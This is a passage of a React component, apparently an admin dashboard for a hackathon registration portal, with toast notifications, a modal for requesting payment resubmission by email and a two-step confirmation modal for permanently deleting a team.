            className={`p-3.5 pointer-events-auto border shadow-2xl backdrop-blur-xl transition-all duration-300 flex items-start gap-3 animate-in slide-in-from-top-3 ${
              toast.type === 'success'
                ? 'bg-[#040E24]/95 border-emerald-400 text-emerald-100 shadow-[0_0_25px_rgba(52,211,153,0.35)]'
                : toast.type === 'error'
                ? 'bg-[#040E24]/95 border-rose-500 text-rose-100 shadow-[0_0_25px_rgba(244,63,94,0.35)]'
                : toast.type === 'warning'
                ? 'bg-[#040E24]/95 border-amber-400 text-amber-100 shadow-[0_0_25px_rgba(251,191,36,0.35)]'
                : 'bg-[#040E24]/95 border-[#38BDF8] text-cyan-100 shadow-[0_0_25px_rgba(56,189,248,0.35)]'
            }`}
          >
            <div className="shrink-0 mt-0.5">
              {toast.type === 'success' && <CheckCircle2 className="w-4 h-4 text-emerald-400" />}
              {toast.type === 'error' && <XCircle className="w-4 h-4 text-rose-400" />}
              {toast.type === 'warning' && <AlertTriangle className="w-4 h-4 text-amber-400" />}
              {toast.type === 'info' && <Info className="w-4 h-4 text-[#38BDF8]" />}
            </div>

            <div className="flex-1 space-y-0.5 text-xs">
              <div className="font-mono-hud font-bold text-white tracking-wide">
                {toast.title}
              </div>
              <div className="text-slate-300 font-sans text-[11px] leading-relaxed">
                {toast.message}
              </div>
            </div>

            <button
              onClick={() => removeToast(toast.id)}
              className="text-slate-400 hover:text-white p-0.5 transition-colors cursor-pointer"
            >
              <XCircle className="w-3.5 h-3.5" />
            </button>
          </div>
        ))}
      </div>

      {/* ADMIN RESUBMISSION REQUEST MODAL */}
      {isResubmitModalOpen && resubmitTeam && (
        <div className="fixed inset-0 z-[9999] bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-[#07101E] border border-amber-500/60 shadow-[0_0_50px_rgba(245,158,11,0.25)] max-w-xl w-full p-6 space-y-5 animate-in zoom-in-95 duration-200 text-left">
            
            {/* Header */}
            <div className="flex items-start justify-between border-b border-white/10 pb-4">
              <div className="space-y-1">
                <div className="flex items-center gap-2 text-amber-400 font-mono text-xs font-bold uppercase tracking-wider">
                  <AlertTriangle className="w-4 h-4 text-amber-400" />
                  <span>REQUEST RESUBMISSION & DISPATCH EMAIL</span>
                </div>
                <h3 className="text-lg font-display font-black text-white">
                  {resubmitTeam.team_name} <span className="text-amber-400 font-mono text-sm">({resubmitTeam.registration_id})</span>
                </h3>
                <div className="text-xs text-slate-400 font-mono">
                  Recipient: <span className="text-white font-bold">{resubmitTeam.leader_name}</span> ({resubmitTeam.leader_email})
                </div>
              </div>

              <button
                onClick={() => setIsResubmitModalOpen(false)}
                className="text-slate-400 hover:text-white p-1 transition-colors cursor-pointer"
              >
                <XCircle className="w-5 h-5" />
              </button>
            </div>

            {/* Quick Reason Presets */}
            <div className="space-y-2">
              <label className="block text-xs font-mono font-bold text-slate-300 uppercase">
                QUICK REASON PRESETS (CLICK TO APPLY)
              </label>
              <div className="flex flex-wrap gap-1.5">
                {[
                  'Payment reference unclear. Please provide valid 12-digit UTR reference.',
                  'Payment transaction unverified. Amount or timestamp does not match our bank statement.',
                  'Round 1 PPT deliverable requires updates. Please strictly follow the official 8-slide template.',
                  'Duplicate team member detected across multiple registrations. Please clarify your squad roster.',
                  'Uploaded presentation file is corrupted or demo repository link is inaccessible.'
                ].map((preset, idx) => (
                  <button
                    key={idx}
                    type="button"
                    onClick={() => {
                      sound.playClick();
                      setResubmitComment(preset);
                    }}
                    className="text-[11px] font-sans px-2.5 py-1 bg-[#121927] hover:bg-[#1E293B] border border-white/10 hover:border-amber-400/50 text-slate-300 hover:text-white text-left transition-colors cursor-pointer rounded-none"
                  >
                    ⚡ {preset.slice(0, 48)}...
                  </button>
                ))}
              </div>
            </div>

            {/* Custom Comment Field */}
            <div className="space-y-2">
              <label className="block text-xs font-mono font-bold text-amber-300 uppercase">
                SECRETARIAT COMMENTS / INSTRUCTIONS (INCLUDED IN EMAIL)
              </label>
              <textarea
                value={resubmitComment}
                onChange={(e) => setResubmitComment(e.target.value)}
                rows={4}
                placeholder="Enter specific instructions or requirements for the team..."
                className="w-full p-3 bg-[#030712] border border-amber-500/40 text-amber-100 text-xs font-mono focus:border-amber-400 focus:outline-none leading-relaxed"
              />
              <div className="text-[11px] text-slate-400 font-sans flex items-center gap-1.5">
                <Mail className="w-3.5 h-3.5 text-amber-400 shrink-0" />
                <span>This comment will be emailed directly to the team leader with their portal login pass.</span>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex items-center justify-end gap-3 pt-3 border-t border-white/10">
              <button
                type="button"
                onClick={() => setIsResubmitModalOpen(false)}
                className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono text-xs cursor-pointer transition-colors"
              >
                CANCEL
              </button>

              <button
                type="button"
                disabled={!resubmitComment.trim() || activeActionKey !== null}
                onClick={async () => {
                  const teamId = resubmitTeam.registration_id;
                  const comment = resubmitComment.trim();
                  setIsResubmitModalOpen(false);
                  await handleAdminAction({
                    action: 'REQUEST_PAYMENT_RESUBMISSION',
                    teamId,
                    reason: comment
                  });
                }}
                className="px-5 py-2.5 bg-gradient-to-r from-amber-500 to-amber-600 hover:brightness-110 text-black font-display font-black text-xs flex items-center gap-2 cursor-pointer shadow-[0_0_20px_rgba(245,158,11,0.4)] disabled:opacity-50 transition-all"
              >
                <Mail className="w-4 h-4 text-black" />
                <span>SEND RESUBMISSION NOTICE & EMAIL</span>
              </button>
            </div>

          </div>
        </div>
      )}

      {/* ADMIN DOUBLE CONFIRMATION DELETE MODAL */}
      {isDeleteModalOpen && teamToDelete && (
        <div className="fixed inset-0 z-[9999] bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-[#07101E] border border-rose-500/80 shadow-[0_0_60px_rgba(244,63,94,0.35)] max-w-xl w-full p-6 space-y-5 animate-in zoom-in-95 duration-200 text-left">
            
            {/* Header */}
            <div className="flex items-start justify-between border-b border-rose-500/30 pb-4">
              <div className="space-y-1">
                <div className="flex items-center gap-2 text-rose-400 font-mono text-xs font-bold uppercase tracking-wider">
                  <AlertTriangle className="w-4 h-4 text-rose-400" />
                  <span>DANGER: DOUBLE CONFIRMATION REQUIRED</span>
                </div>
                <h3 className="text-lg font-display font-black text-white">
                  Permanently Delete <span className="text-rose-400 font-mono">{teamToDelete.team_name}</span>
                </h3>
                <div className="text-xs text-slate-400 font-mono">
                  Registration ID: <span className="text-white font-bold">{teamToDelete.registration_id}</span> • Leader: {teamToDelete.leader_name}
                </div>
              </div>

              <button
                onClick={() => {
                  setIsDeleteModalOpen(false);
                  setTeamToDelete(null);
                }}
                className="text-slate-400 hover:text-white p-1 transition-colors cursor-pointer"
              >
                <XCircle className="w-5 h-5" />
              </button>
            </div>

            {/* Warning Details Banner */}
            <div className="p-3.5 bg-rose-950/40 border border-rose-500/50 space-y-2">
              <div className="text-xs font-mono font-bold text-rose-300 uppercase flex items-center gap-1.5">
                <Trash2 className="w-3.5 h-3.5 text-rose-400" />
                <span>IRREVERSIBLE DATA DESTRUCTION WARNING</span>
              </div>
              <ul className="text-[11px] text-rose-200/90 font-sans space-y-1 list-disc list-inside leading-relaxed">
                <li>Team credentials (<span className="font-mono">{teamToDelete.access_token}</span>) and portal login will be destroyed immediately.</li>
                <li>All registered squad members ({teamToDelete.members?.length || 0} members) will be purged.</li>
                <li>Uploaded Round 1 presentations, problem statement link, and payment logs will be removed.</li>
              </ul>
            </div>

            {/* Step 1: Checkbox Checkpoint */}
            <label className="flex items-start gap-3 p-3 bg-[#030712] border border-white/10 hover:border-rose-500/40 cursor-pointer transition-colors">
              <input
                type="checkbox"
                checked={hasCheckedDeleteWarning}
                onChange={(e) => setHasCheckedDeleteWarning(e.target.checked)}
                className="mt-0.5 w-4 h-4 accent-rose-500 cursor-pointer"
              />
              <div className="text-xs text-slate-200 leading-snug">
                <span className="font-bold text-white block mb-0.5">Confirmation Checkpoint 1</span>
                I understand that this action is permanent, will delete this team across all databases, and cannot be undone.
              </div>
            </label>

            {/* Step 2: Verification Input Checkpoint */}
            <div className="space-y-2">
              <div className="flex items-center justify-between text-xs">
                <label className="font-mono font-bold text-slate-300 uppercase">
                  CONFIRMATION CHECKPOINT 2 (TYPE ID TO MATCH)
                </label>
                <span className={`text-[10px] font-mono font-bold px-2 py-0.5 ${
                  deleteIdMatches
                    ? 'bg-emerald-950 border border-emerald-500/60 text-emerald-300'
                    : 'bg-slate-900 border border-slate-700 text-slate-400'
                }`}>
                  {deleteIdMatches ? '✓ ID MATCHED' : 'AWAITING MATCH'}
                </span>
              </div>

              <p className="text-[11px] text-slate-400 font-sans">
                Please type <strong className="font-mono text-rose-300 bg-rose-950/80 px-2 py-0.5 border border-rose-500/40">{teamToDelete.registration_id}</strong> below to confirm deletion:
              </p>

              <input
                type="text"
                value={deleteConfirmInput}
                onChange={(e) => setDeleteConfirmInput(e.target.value)}
                placeholder={teamToDelete.registration_id}
                autoCapitalize="off"
                autoCorrect="off"
                spellCheck={false}
                className="w-full p-2.5 bg-[#030712] border border-rose-500/50 text-rose-200 text-xs font-mono focus:border-rose-400 focus:outline-none tracking-wider"
              />
            </div>

            {/* Action Buttons */}
            <div className="flex items-center justify-end gap-3 pt-3 border-t border-white/10">
              <button
                type="button"
                onClick={() => {
                  setIsDeleteModalOpen(false);
                  setTeamToDelete(null);
                }}
                className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono text-xs cursor-pointer transition-colors"
              >
                CANCEL / ABORT
              </button>

              <button
                type="button"
                disabled={!hasCheckedDeleteWarning || !deleteIdMatches || activeActionKey !== null}
                onClick={async () => {
                  // Delete by the row's UUID, not the registration ID: a
                  // duplicated registration ID matches two rows and made the
                  // lookup fail with "Team not found" — the UUID is always
                  // unique, so each duplicate can be purged individually.
                  const targetId = teamToDelete.id || teamToDelete.registration_id;
                  setIsDeleteModalOpen(false);
                  setTeamToDelete(null);
                  await handleAdminAction({
                    action: 'DELETE_TEAM',
                    teamId: targetId
                  });
                }}
                className="px-5 py-2.5 bg-gradient-to-r from-rose-600 to-rose-700 hover:brightness-110 text-white font-display font-black text-xs flex items-center gap-2 cursor-pointer shadow-[0_0_20px_rgba(244,63,94,0.4)] disabled:opacity-40 disabled:cursor-not-allowed transition-all"
              >
                <Trash2 className="w-4 h-4 text-white" />
                <span>PERMANENTLY PURGE SQUAD</span>
              </button>
            </div>

          </div>
        </div>
      )}

      {/* ADMIN PAYMENT RECEIPT MODAL */}
      {selectedTeam && (
        <PaymentReceiptModal
          isOpen={isReceiptModalOpen}
          onClose={() => setIsReceiptModalOpen(false)}
          team={selectedTeam}
        />
      )}

    </div>
  );
}
